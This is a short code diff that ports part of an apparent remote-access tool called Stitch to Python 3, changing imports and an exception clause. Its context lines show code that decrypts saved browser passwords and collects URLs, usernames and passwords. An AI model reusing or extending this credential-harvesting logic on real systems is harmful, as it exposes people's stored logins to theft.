@@ -2,8 +2,8 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
-from stitch_help import *
-from stitch_utils import *
+from .stitch_help import *
+from .stitch_utils import *
 
 def st_recvall(client, count, aes_enc=None, encryption=True):
     buf = b''
@@ -677,7 +677,7 @@ class stitch_commands_library:
                             password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                             if password:
                                 info_list += 'origin_url: {}\nusername: {}\npassword: {}\n\n'.format(information[0],information[1],str(password))
-                    except sqlite3.OperationalError, e:
+                    except sqlite3.OperationalError as e:
                             e = str(e)
                             connection.close()
                             os.remove(zip_loc)
